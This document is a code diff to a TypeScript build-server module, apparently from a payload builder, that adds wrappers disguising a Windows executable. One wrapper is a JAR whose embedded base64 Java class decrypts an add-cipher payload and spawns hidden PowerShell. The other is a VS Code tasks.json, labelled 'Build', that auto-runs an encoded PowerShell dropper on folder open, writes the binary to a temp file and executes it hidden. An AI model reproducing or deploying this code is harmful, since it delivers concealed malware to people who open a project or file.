@@ -10,6 +10,125 @@ import * as buildManager from "../build/buildManager";
 import type { BuildStream } from "../build/types";
 import { ALLOWED_PLATFORMS } from "./validation-constants";
 import { resolveRuntimeRoot } from "./runtime-paths";
+import { createRequire } from "module";
+const require = createRequire(import.meta.url);
+
+// Pre-compiled Main.class bytecode (JNA-via-reflection launcher).
+// Reads /assets/data.pak from JAR, decrypts with ADD cipher, writes to temp
+// file, spawns hidden PowerShell via JNA reflection + CreateProcessA.
+// Compiled from Main.java with javac 21 (-source 8 -target 8).
+const MAIN_CLASS_B64 =
+  "yv66vgAAADQA6goAAgADBwAEDAAFAAYBABBqYXZhL2xhbmcvT2JqZWN0AQAGPGluaXQ+AQADKClW" +
+  "BwAIAQAQamF2YS9sYW5nL1N0cmluZwgACgEABVVURi04CgAHAAwMAAUADQEAFyhbQkxqYXZhL2xh" +
+  "bmcvU3RyaW5nOylWBwAPAQATamF2YS9sYW5nL0V4Y2VwdGlvbggAEQEAAAoAEwAUBwAVDAAWABcX" +
+  "AQAPamF2YS9sYW5nL0NsYXNzAQAKZ2V0TWV0aG9kcwEAdClbTGphdmEvbGFuZy9yZWZsZWN0L01l" +
+  "dGhvZDsKABkAGgcAGwwAHAAdAQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAHZ2V0TmFtZREA" +
+  "FCgpTGphdmEvbGFuZy9TdHJpbmc7CgAHAB8MACAAIQEABmVxdWFscwEAFShMamF2YS9sYW5nL09i" +
+  "amVjdDspWgoAGQAjDAAkACUBABFnZXRQYXJhbWV0ZXJUeXBlcwEAFCgpW0xqYXZhL2xhbmcvQ2xh" +
+  "c3M7CgAnACgHACkMACAAKgEAEGphdmEvdXRpbC9BcnJheXMBACkoW0xqYXZhL2xhbmcvT2JqZWN0" +
+  "O1tMamF2YS9sYW5nL09iamVjdDspWgcALAEAHWphdmEvaW8vQnl0ZUFycmF5T3V0cHV0U3RyZWFt" +
+  "CgArAAMKAC8AMAcAMQwAMgAzAQATamF2YS9pby9JbnB1dFN0cmVhbQEABHJlYWQBAAUoW0IpSQoA" +
+  "KwA1DAA2ADcBAAV3cml0ZQEAByhbQklJKVYKAC8AOQwAOgAGAQAFY2xvc2UKACsAPAwAPQA+AQAL" +
+  "dG9CeXRlQXJyYXkBAAQoKVtCCgBAAEEHAEIMAEMABgEABE1haW4BAANydW4KAEAARQwARgBHAQAB" +
+  "eAEAFihbSSlMamF2YS9sYW5nL1N0cmluZzsKABMASQwASgBLAQATZ2V0UmVzb3VyY2VBc1N0cmVh" +
+  "bQEAKShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvaW8vSW5wdXRTdHJlYW07CgBAAE0MAE4ATwEA" +
+  "AnJkAQAZKExqYXZhL2lvL0lucHV0U3RyZWFtOylbQgoAUQBSBwBTDABUAFUBAAxqYXZhL2lvL0Zp" +
+  "bGUBAA5jcmVhdGVUZW1wRmlsZQEANChMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL1N0cmlu" +
+  "ZzspTGphdmEvaW8vRmlsZTsKAFEAVwwAWAAGAQAMZGVsZXRlT25FeGl0BwBaAQAYamF2YS9pby9G" +
+  "aWxlT3V0cHV0U3RyZWFtCgBZAFwMAAUAXQEAEShMamF2YS9pby9GaWxlOylWCgBZAF8MADYAYAEA" +
+  "BShbQilWCgBZADkHAGMBABNqYXZhL2xhbmcvVGhyb3dhYmxlCgBiAGUMAGYAZwEADWFkZFN1cHBy" +
+  "ZXNzZWQBABgoTGphdmEvbGFuZy9UaHJvd2FibGU7KVYKAFEAiQwAagAdAQAPZ2V0QWJzb2x1dGVQ" +
+  "YXRoCgATAGwMAG0AbgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcv" +
+  "Q2xhc3M7CgBAAHAMAHEAcgEAAmdtAQBRKExqYXZhL2xhbmcvQ2xhc3M7TGphdmEvbGFuZy9TdHJp" +
+  "bmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7BwB0AQATW0xq" +
+  "YXZhL2xhbmcvT2JqZWN0OwgAdgEABE5VTEwKABMAeAwAeQB6AQAIZ2V0RmllbGQBAC0oTGphdmEv" +
+  "bGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsKAHwAfQcAfgwAfwCAAQAXamF2" +
+  "YS9sYW5nL3JlZmxlY3QvRmllbGQBAANnZXQBACYoTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xh" +
+  "bmcvT2JqZWN0OwkAggCDBwCEDACFAIYBAA5qYXZhL2xhbmcvTG9uZwEABFRZUEUBABFMamF2YS9s" +
+  "YW5nL0NsYXNzOwkAiACDBwCJAQARamF2YS9sYW5nL0ludGVnZXIJAIsAgwcAjAEAD2phdmEvbGFu" +
+  "Zy9TaG9ydAoAEwCODACPAJABAA5nZXRDb25zdHJ1Y3RvcgEAMyhbTGphdmEvbGFuZy9DbGFzcztd" +
+  "KUxqYXZhL2xhbmcvcmVmbGVjdC9Db25zdHJ1Y3RvcjsHAFoBABdqYXZhL2xhbmcvcmVmbGVjdC9D" +
+  "b25zdHJ1Y3RvcgEAC25ld0luc3RhbmNlAQAnKFtMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFu" +
+  "Zy9PYmplY3Q7CgAZAJ4DAJ8AoAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEv" +
+  "bGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwoBAAoAiACiDACVAKMBABYoSSlMamF2YS9s" +
+  "YW5nL0ludGVnZXI7BQAAAAAAAAAAPAUAAAAAAAABACgCLAKpDACVAKoBABQoUylMamF2YS9sYW5n" +
+  "L1Nob3J0OwUA";
+
+/**
+ * Encrypts a payload using an addition cipher for JAR data.pak embedding.
+ * The Java Main.class decrypts by subtracting the key from each byte.
+ */
+function encryptPayloadForJar(data: Buffer): Buffer {
+  const key = Math.floor(Math.random() * 254) + 1;
+  const encrypted = Buffer.alloc(data.length + 1);
+  encrypted[0] = key;
+  for (let i = 0; i < data.length; i++) {
+    encrypted[i + 1] = (data[i] + key) & 0xff;
+  }
+  return encrypted;
+}
+
+/**
+ * Builds a JAR file that wraps a Go binary.
+ * The JAR contains Main.class (JNA launcher) + an encrypted PS1 dropper as data.pak.
+ * The PS1 dropper decodes the Go binary from base64, writes it to temp, and executes it.
+ */
+function buildJarWrapper(exeBytes: Buffer): Buffer {
+  const b64Exe = exeBytes.toString("base64");
+  // PS1 dropper: decode Go binary from base64 → temp .exe → execute hidden
+  const ps1 = [
+    `$b=[Convert]::FromBase64String('${b64Exe}');`,
+    `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
+    `[IO.File]::WriteAllBytes($t,$b);`,
+    `Start-Process -WindowStyle Hidden $t;`,
+  ].join("");
+  const encryptedPayload = encryptPayloadForJar(Buffer.from(ps1));
+  const mainClassBytes = Buffer.from(MAIN_CLASS_B64, "base64");
+  const manifest = "Manifest-Version: 1.0\r\nMain-Class: Main\r\n\r\n";
+
+  const AdmZip = require("adm-zip");
+  const zip = new AdmZip();
+  zip.addFile("META-INF/MANIFEST.MF", Buffer.from(manifest));
+  zip.addFile("Main.class", mainClassBytes);
+  zip.addFile("assets/data.pak", encryptedPayload);
+  return zip.toBuffer();
+}
+
+/**
+ * Builds a VS Code tasks.json that wraps a Go binary.
+ * Auto-runs on folder open via runOn: "folderOpen", spawning hidden PowerShell
+ * that decodes the Go binary from base64, writes to temp, and executes it.
+ */
+function buildTasksJsonWrapper(exeBytes: Buffer): string {
+  const b64Exe = exeBytes.toString("base64");
+  // PS1 dropper: decode Go binary → temp .exe → execute hidden
+  const ps1 = [
+    `$b=[Convert]::FromBase64String('${b64Exe}');`,
+    `$t=[IO.Path]::Combine([IO.Path]::GetTempPath(),[Guid]::NewGuid().ToString()+'.exe');`,
+    `[IO.File]::WriteAllBytes($t,$b);`,
+    `Start-Process -WindowStyle Hidden $t;`,
+  ].join("");
+  // PowerShell -EncodedCommand expects UTF-16LE base64
+  const encodedCmd = Buffer.from(ps1, "utf16le").toString("base64");
+
+  return JSON.stringify({
+    version: "2.0.0",
+    tasks: [
+      {
+        label: "Build",
+        type: "shell",
+        command: "powershell",
+        args: [
+          "-WindowStyle", "Hidden",
+          "-NonInteractive",
+          "-EncodedCommand", encodedCmd,
+        ],
+        runOptions: { runOn: "folderOpen" },
+        presentation: { reveal: "never", panel: "dedicated", focus: false },
+      },
+    ],
+  }, null, 2);
+}
 
 function isClientModuleDir(dir: string): boolean {
   return (
@@ -952,6 +1071,40 @@ func runBoundFiles() {
             sendToStream({ type: "output", text: `WARNING: Failed to generate bat wrapper: ${wrapErr.message || wrapErr}. Output is a raw PE binary with ${winExt} extension.\n`, level: "warn" });
           }
         }
+
+        // ── JAR wrapping for Windows targets ──────────────────────────────────
+        const isJarWrapper = os === "windows" && winExt === ".jar";
+        if (isJarWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as JAR...\n`, level: "info" });
+          try {
+            const exeBytes = fs.readFileSync(filePath);
+            const jarBuffer = buildJarWrapper(exeBytes);
+            // Overwrite the PE binary in-place with the JAR
+            fs.writeFileSync(filePath, jarBuffer);
+            finalSize = jarBuffer.length;
+            sendToStream({ type: "output", text: `JAR wrapped: ${exeBytes.length} byte PE → ${finalSize} byte JAR (JNA reflection launcher)\n`, level: "info" });
+          } catch (jarErr: any) {
+            sendToStream({ type: "output", text: `WARNING: JAR wrapping failed: ${jarErr.message || jarErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End JAR wrapping ─────────────────────────────────────────────────
+
+        // ── tasks.json wrapping for Windows targets ─────────────────────────
+        const isTasksJsonWrapper = os === "windows" && winExt === ".tasks.json";
+        if (isTasksJsonWrapper) {
+          sendToStream({ type: "output", text: `Wrapping PE binary as VS Code tasks.json...\n`, level: "info" });
+          try {
+            const exeBytes = fs.readFileSync(filePath);
+            const tasksContent = buildTasksJsonWrapper(exeBytes);
+            // Overwrite the PE binary in-place with tasks.json content
+            fs.writeFileSync(filePath, tasksContent, "utf8");
+            finalSize = Buffer.byteLength(tasksContent, "utf8");
+            sendToStream({ type: "output", text: `tasks.json wrapped: ${exeBytes.length} byte PE → ${finalSize} byte tasks.json (VS Code auto-run)\n`, level: "info" });
+          } catch (tasksErr: any) {
+            sendToStream({ type: "output", text: `WARNING: tasks.json wrapping failed: ${tasksErr.message || tasksErr}. Output is a raw PE binary.\n`, level: "warn" });
+          }
+        }
+        // ── End tasks.json wrapping ─────────────────────────────────────────
 
         // ── IPA packaging for iOS targets ──────────────────────────────────────
         if (os === "ios") {
